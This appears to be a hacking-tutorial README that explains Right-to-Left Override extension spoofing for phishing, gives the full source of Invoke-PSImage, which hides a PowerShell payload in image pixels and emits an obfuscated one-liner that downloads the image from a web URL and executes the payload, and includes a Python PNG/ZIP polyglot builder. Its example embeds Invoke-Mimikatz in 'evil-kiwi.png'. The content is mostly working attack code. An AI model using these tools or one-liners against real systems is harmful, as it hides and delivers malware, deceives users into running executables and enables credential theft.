<p align="center">
      <a href="https://www.youtube.com/watch?v=467YXWBlL9E">
        <img src=https://i.ytimg.com/vi/467YXWBlL9E/hqdefault.jpg width="500" alt="Python" />
      </a>
      <br>YouTube Tutorial	
</p>



# R2L OverRide Character
(Hit the copy button on the right side of the text box. Yes it is there it is an invisible character)

```
‮
```

A hacker may use the Right-to-Left Override (RLO) character, a special unicode character, to spoof file extensions as part of a phishing or malware attack. The RLO character, when used in a file name, reverses the direction of the text that comes after it. 

For instance, an executable file named: `duplgnp.exe` 

could be made to appear as `duplexe.png` 

by inserting the RLO character before `exe`. This tricks the user into believing that they are opening an innocent image, when in reality they are launching an executable that could potentially install malicious software on their system. The victim's operating system and file explorer will interpret the RLO character and display the spoofed file extension.


<img src=https://github.com/I-Am-Jakoby/PowerShell-for-Hackers/assets/20657601/0133fe87-02e3-423f-b5ee-d35ae10db57c width="400" alt="RTL Test" />

Here is an example script to help illustrate the concept:

```powershell
# Define a string
$string = "Hello, world!"

# Print the string normally
Write-Output $string

# Define the right-to-left override character
$rlo = [char]::ConvertFromUtf32(0x202E)

# Add the RLO character to the start of the string
$reversedString = $rlo + $string

# Print the string with the RLO character
Write-Output $reversedString
```

---

# Hide in the pixels of an image

<p align="center">
        <img src=https://github.com/I-Am-Jakoby/PowerShell-for-Hackers/blob/main/VideoNotes/assets/diff.png width="800" alt="Python" />
</p>

The Images above show the before and after of what an image looks like after a payload is injected. 

After running the script it will generate a one liner used to execute the code stored in the pixels. Below is an example output of the command. 

```powershell
# SYNTAX:
Invoke-PSImage -Script .\calc.ps1 -Out calc.png -Image .\jakoby.png

sal a New-Object;Add-Type -A System.Drawing;
$g=a System.Drawing.Bitmap("$env:userprofile\desktop\calc.png");
$o=a Byte[] 600;(0..0)|%{foreach($x in(0..599)){$p=$g.GetPixel($x,$_);
$o[$_*600+$x]=([math]::Floor(($p.B-band15)*16)-bor($p.G-band15))}};
$g.Dispose();IEX([System.Text.Encoding]::ASCII.GetString($o[0..9]))
```

1.  The script takes four parameters: `$Script`, `$Out`, `$Image`, and two switch parameters, `$WebClient` and `$PictureBox`.
    
    -   `$Script` is the path to the script to be embedded in the image.
    -   `$Out` is the path to save the output image.
    -   `$Image` is an optional parameter for an existing image to embed the script in.
    -   `$WebClient` and `$PictureBox` switches are used to determine the method of extracting the script from the image.
2.  System.Drawing and System.Web assemblies are loaded to manipulate images and encode/decode data.
    
3.  The script checks if the provided paths are absolute or relative, and if they are relative, it converts them to absolute paths.
    
4.  The script then reads the payload PowerShell script that will be embedded into the image.
    
5.  If an existing image is provided, it is read into a bitmap.
    
6.  The script then checks if the payload fits in the image by comparing the size of the image (in bytes) to the size of the payload.
    
7.  The script loops through the RGB array of the image, copying the payload into it. It uses the least significant 4 bits of 2 color values (2 of RGB) in each pixel for as many pixels as are needed for the payload.
    
8.  If no existing image is provided, it creates a new image. The size of the image is calculated based on the payload size.
    
9.  Once the payload is embedded, the image is saved as a PNG.
    
10.  The script also generates a one-liner that can be used to extract and execute the embedded script from the image. The method of extraction depends on whether the `$WebClient` or `$PictureBox` switch was set.

## PSImage Script

---
<details>
  <summary>Invoke-PSImage.ps1 ⬅️⬅️⬅️⬅️</summary>

	
```powershell
function Invoke-PSImage
{
<#
.SYNOPSIS

Embeds a PowerShell script in an image and generates a oneliner to execute it.
Author:  Barrett Adams (@peewpw)

.DESCRIPTION

This tool can either create an image with just the target data, or can embed the payload in
an existing image. When embeding, the least significant 4 bits of 2 color values (2 of RGB) in
each pixel (for as many pixels as are needed for the payload). Image quality will suffer as
a result, but it still looks decent. The image is saved as a PNG, and can be losslessly
compressed without affecting the ability to execute the payload as the data is stored in the
colors themselves. It can accept most image types as input, but output will always be a PNG
because it needs to be lossless.

.PARAMETER Script

The path to the script to embed in the Image.

.PARAMETER Out

The file to save the resulting image to (image will be a PNG)

.PARAMETER Image

The image to embed the script in. (optional)

.PARAMETER WebRequest

Output a command for reading the image from the web using Net.WebClient.
You will need to host the image and insert the URL into the command.

.PARAMETER PictureBox

Output a command for reading the image from the web using System.Windows.Forms.PictureBox.
You will need to host the image and insert the URL into the command.

.EXAMPLE

PS>Import-Module .\Invoke-PSImage.ps1
PS>Invoke-PSImage -Script .\Invoke-Mimikatz.ps1 -Out .\evil-kiwi.png -Image .\kiwi.jpg 
   [Oneliner to execute from a file]
   
#>

    [CmdletBinding()] Param (
        [Parameter(Position = 0, Mandatory = $True)]
        [String]
        $Script,
    
        [Parameter(Position = 1, Mandatory = $True)]
        [String]
        $Out,
    
        [Parameter(Position = 2, Mandatory = $False)]
        [String]
        $Image,

        [switch] $WebClient,
        
        [switch] $PictureBox
    )
    # Stop if we hit an error instead of making more errors
    $ErrorActionPreference = "Stop"

    # Load some assemblies
    [void] [System.Reflection.Assembly]::LoadWithPartialName("System.Drawing")
    [void] [System.Reflection.Assembly]::LoadWithPartialName("System.Web")
    
    # Normalize paths beacuse powershell is sometimes bad with them.
    if (-Not [System.IO.Path]::IsPathRooted($Script)){
        $Script = [System.IO.Path]::GetFullPath((Join-Path (Get-Location) $Script))
    }
    if (-Not [System.IO.Path]::IsPathRooted($Out)){
        $Out = [System.IO.Path]::GetFullPath((Join-Path (Get-Location) $Out))
    }

    $testurl = "http://example.com/" + [System.IO.Path]::GetFileName($Out)

    # Read in the script
    $ScriptBlockString = [IO.File]::ReadAllText($Script)
    $in = [ScriptBlock]::Create($ScriptBlockString)
    $payload = [system.Text.Encoding]::ASCII.GetBytes($in)

    if ($Image) {
        # Normalize paths beacuse powershell is sometimes bad with them.
        if (-Not [System.IO.Path]::IsPathRooted($Image)){
            $Image = [System.IO.Path]::GetFullPath((Join-Path (Get-Location) $Image))
        }
        
        # Read the image into a bitmap
        $img = New-Object System.Drawing.Bitmap($Image)

        $width = $img.Size.Width
        $height = $img.Size.Height

        # Lock the bitmap in memory so it can be changed programmatically.
        $rect = New-Object System.Drawing.Rectangle(0, 0, $width, $height);
        $bmpData = $img.LockBits($rect, [System.Drawing.Imaging.ImageLockMode]::ReadWrite, $img.PixelFormat)
        $ptr = $bmpData.Scan0

        # Copy the RGB values to an array for easy modification
        $bytes  = [Math]::Abs($bmpData.Stride) * $img.Height
        $rgbValues = New-Object byte[] $bytes;
        [System.Runtime.InteropServices.Marshal]::Copy($ptr, $rgbValues, 0, $bytes);

        # Check that the payload fits in the image 
        if($bytes/2 -lt $payload.Length) {
            Write-Error "Image not large enough to contain payload!"
            $img.UnlockBits($bmpData)
            $img.Dispose()
            Break
        }

        # Generate a random string to use to fill other pixel info in the picture.
        # (Calling get-random everytime is too slow)
        $randstr = [System.Web.Security.Membership]::GeneratePassword(128,0)
        $randb = [system.Text.Encoding]::ASCII.GetBytes($randstr)
        
        # loop through the RGB array and copy the payload into it
        for ($counter = 0; $counter -lt ($rgbValues.Length)/3; $counter++) {
            if ($counter -lt $payload.Length){
                $paybyte1 = [math]::Floor($payload[$counter]/16)
                $paybyte2 = ($payload[$counter] -band 0x0f)
                $paybyte3 = ($randb[($counter+2)%109] -band 0x0f)
            } else {
                $paybyte1 = ($randb[$counter%113] -band 0x0f)
                $paybyte2 = ($randb[($counter+1)%67] -band 0x0f)
                $paybyte3 = ($randb[($counter+2)%109] -band 0x0f)
            }
            $rgbValues[($counter*3)] = ($rgbValues[($counter*3)] -band 0xf0) -bor $paybyte1
            $rgbValues[($counter*3+1)] = ($rgbValues[($counter*3+1)] -band 0xf0) -bor $paybyte2
            $rgbValues[($counter*3+2)] = ($rgbValues[($counter*3+2)] -band 0xf0) -bor $paybyte3
        }

        # Copy the array of RGB values back to the bitmap
        [System.Runtime.InteropServices.Marshal]::Copy($rgbValues, 0, $ptr, $bytes)
        $img.UnlockBits($bmpData)

        # Write the image to a file
        $img.Save($Out, [System.Drawing.Imaging.ImageFormat]::Png)
        $img.Dispose()
        
        # Get a bunch of numbers we need to use in the oneliner
        $rows = [math]::Ceiling($payload.Length/$width)
        $array = ($rows*$width)
        $lrows = ($rows-1)
        $lwidth = ($width-1)
        $lpayload = ($payload.Length-1)

        if($WebClient) {
            $pscmd = "sal a New-Object;Add-Type -A System.Drawing;`$g=a System.Drawing.Bitmap((a Net.WebClient).OpenRead(`"$testurl`"));`$o=a Byte[] $array;(0..$lrows)|%{foreach(`$x in(0..$lwidth)){`$p=`$g.GetPixel(`$x,`$_);`$o[`$_*$width+`$x]=([math]::Floor((`$p.B-band15)*16)-bor(`$p.G -band 15))}};IEX([System.Text.Encoding]::ASCII.GetString(`$o[0..$lpayload]))"
        } elseif($PictureBox) {
            $pscmd = "sal a New-Object;Add-Type -A System.Windows.Forms;(`$d=a System.Windows.Forms.PictureBox).Load(`"$testurl`");`$g=`$d.Image;`$o=a Byte[] $array;(0..$lrows)|%{foreach(`$x in(0..$lwidth)){`$p=`$g.GetPixel(`$x,`$_);`$o[`$_*$width+`$x]=([math]::Floor((`$p.B-band15)*16)-bor(`$p.G -band 15))}};IEX([System.Text.Encoding]::ASCII.GetString(`$o[0..$lpayload]))"
        } else {
            $pscmd = "sal a New-Object;Add-Type -A System.Drawing;`$g=a System.Drawing.Bitmap(`"$Out`");`$o=a Byte[] $array;(0..$lrows)|%{foreach(`$x in(0..$lwidth)){`$p=`$g.GetPixel(`$x,`$_);`$o[`$_*$width+`$x]=([math]::Floor((`$p.B-band15)*16)-bor(`$p.G-band15))}};`$g.Dispose();IEX([System.Text.Encoding]::ASCII.GetString(`$o[0..$lpayload]))"
        }

        return $pscmd

    } else {
        # Decide how large our image needs to be (always square for easy math)
        $side = ([int] ([math]::ceiling([math]::Sqrt([math]::ceiling($payload.Length / 3)) + 3) / 4)) * 4

        # Decide how large our image needs to be (always square for easy math)
        $rgbValues = New-Object byte[] ($side * $side * 3);
        $randstr = [System.Web.Security.Membership]::GeneratePassword(128,0)
        $randb = [system.Text.Encoding]::ASCII.GetBytes($randstr)

        # loop through the RGB array and copy the payload into it
        for ($counter = 0; $counter -lt ($rgbValues.Length); $counter++) {
            if ($counter -lt $payload.Length){
                $rgbValues[$counter] = $payload[$counter]
            } else {
                $rgbValues[$counter] = $randb[$counter%113]
            }
        }

        # Copy the array of RGB values back to the bitmap
        $ptr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($rgbValues.Length)
        [System.Runtime.InteropServices.Marshal]::Copy($rgbValues, 0, $ptr, $rgbValues.Length)
        $img = New-Object System.Drawing.Bitmap($side, $side, ($side*3), [System.Drawing.Imaging.PixelFormat]::Format24bppRgb, $ptr)

        # Write the image to a file
        $img.Save($Out, [System.Drawing.Imaging.ImageFormat]::Png)
        $img.Dispose()
        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($ptr);
        
        # Get a bunch of numbers we need to use in the oneliner
        $array = ($side*$side)*3
        $lrows = ($side-1)
        $lwidth = ($side-1)
        $width = ($side)
        $lpayload = ($payload.Length-1)

        if($WebClient) {
            $pscmd = "sal a New-Object;Add-Type -A System.Drawing;`$g=a System.Drawing.Bitmap((a Net.WebClient).OpenRead(`"$testurl`"));`$o=a Byte[] $array;(0..$lrows)|%{foreach(`$x in(0..$lwidth)){`$p=`$g.GetPixel(`$x,`$_);`$o[(`$_*$width+`$x)*3]=`$p.B;`$o[(`$_*$width+`$x)*3+1]=`$p.G;`$o[(`$_*$width+`$x)*3+2]=`$p.R}};IEX([System.Text.Encoding]::ASCII.GetString(`$o[0..$lpayload]))"
        } elseif($PictureBox) {
            $pscmd = "sal a New-Object;Add-Type -A System.Windows.Forms;(`$d=a System.Windows.Forms.PictureBox).Load(`"$testurl`");`$g=`$d.Image;`$o=a Byte[] $array;(0..$lrows)|%{foreach(`$x in(0..$lwidth)){`$p=`$g.GetPixel(`$x,`$_);`$o[(`$_*$width+`$x)*3]=`$p.B;`$o[(`$_*$width+`$x)*3+1]=`$p.G;`$o[(`$_*$width+`$x)*3+2]=`$p.R}};IEX([System.Text.Encoding]::ASCII.GetString(`$o[0..$lpayload]))"
        } else {
            $pscmd = "sal a New-Object;Add-Type -A System.Drawing;`$g=a System.Drawing.Bitmap(`"$Out`");`$o=a Byte[] $array;(0..$lrows)|%{foreach(`$x in(0..$lwidth)){`$p=`$g.GetPixel(`$x,`$_);`$o[(`$_*$width+`$x)*3]=`$p.B;`$o[(`$_*$width+`$x)*3+1]=`$p.G;`$o[(`$_*$width+`$x)*3+2]=`$p.R}};`$g.Dispose();IEX([System.Text.Encoding]::ASCII.GetString(`$o[0..$lpayload]))"
        }

        return $pscmd
    }
}
```
</details>


---

# PolyGlot Files 

Import required modules: The script starts by importing the zlib and sys modules. zlib is used for data compression while sys is used to interact with the Python runtime environment.

Define PNG magic number: The PNG_MAGIC constant is defined to match the standard header of PNG files.

Check command line arguments: The script expects three command line arguments: the input PNG file, the input content file, and the output PNG file. If the number of arguments is not correct, it prints a usage message and stops.

Define the fixup_zip function: This function adjusts the offsets in the central directory of a ZIP file when the ZIP file is embedded into the PNG file.

Open files: The script opens the input PNG file, the input content file, and the output PNG file.

Read and write PNG header: It reads the header from the input PNG file, checks that it matches the PNG magic number, and writes it to the output PNG file.

Process PNG chunks: The script then enters a loop where it reads and processes each chunk from the input PNG file:

Read chunk: It reads the length, type, body, and checksum of the current chunk.

Embed content in IDAT chunk: If the chunk type is IDAT (image data), it reads all data from the content file into a byte array, and embeds this data into the chunk:

It calculates the start offset of the embedded data within the PNG file.
If the content file is a ZIP file, it uses the fixup_zip function to adjust the ZIP file offsets.
It increases the chunk length and checksum to account for the embedded data, and appends the embedded data to the chunk body.
Write chunk: It writes the updated chunk to the output PNG file.

End on IEND chunk: If the chunk type is IEND (end of image), it breaks out of the loop.

Close files: Finally, it closes all three files. The output PNG file now contains the data from the content file embedded within the IDAT chunk.

![h](https://github.com/I-Am-Jakoby/PowerShell-for-Hackers/assets/20657601/351ab16b-54bb-4c56-aa54-efb674223eab)

(Yes that file. Save that image and change the extension to `.zip`)

```
import zlib
import sys

PNG_MAGIC = b"\x89PNG\r\n\x1a\n"

if len(sys.argv) != 4:
	print(f"USAGE: {sys.argv[0]} cover.png content.bin output.png")

# this function is gross
def fixup_zip(data, start_offset):
	end_central_dir_offset = data.rindex(b"PK\x05\x06")
	cdent_count = int.from_bytes(data[end_central_dir_offset+10:end_central_dir_offset+10+2], "little")
	cd_range = slice(end_central_dir_offset+16, end_central_dir_offset+16+4)
	central_dir_start_offset = int.from_bytes(data[cd_range], "little")
	data[cd_range] = (central_dir_start_offset + start_offset).to_bytes(4, "little")
	for _ in range(cdent_count):
		central_dir_start_offset = data.index(b"PK\x01\x02", central_dir_start_offset)
		off_range = slice(central_dir_start_offset+42, central_dir_start_offset+42+4)
		off = int.from_bytes(data[off_range], "little")
		data[off_range] = (off + start_offset).to_bytes(4, "little")
		central_dir_start_offset += 1

png_in = open(sys.argv[1], "rb")
content_in = open(sys.argv[2], "rb")
png_out = open(sys.argv[3], "wb")

png_header = png_in.read(len(PNG_MAGIC))
assert(png_header == PNG_MAGIC)
png_out.write(png_header)

while True:
	chunk_len = int.from_bytes(png_in.read(4), "big")
	chunk_type = png_in.read(4)
	chunk_body = png_in.read(chunk_len)
	chunk_csum = int.from_bytes(png_in.read(4), "big")
	
	if chunk_type == b"IDAT":
		start_offset = png_in.tell()-4
		content_dat = bytearray(content_in.read())
		print("Embedded file starts at offset", hex(start_offset))
		
		if sys.argv[2].endswith(".zip"):
			print("Fixing up zip offsets...")
			fixup_zip(content_dat, start_offset)
		
		chunk_len += len(content_dat)
		chunk_body += content_dat
		chunk_csum = zlib.crc32(content_dat, chunk_csum)
	
	png_out.write(chunk_len.to_bytes(4, "big"))
	png_out.write(chunk_type)
	png_out.write(chunk_body)
	png_out.write(chunk_csum.to_bytes(4, "big"))
	
	if chunk_type == b"IEND":
		break

png_in.close()
content_in.close()
png_out.close()

```
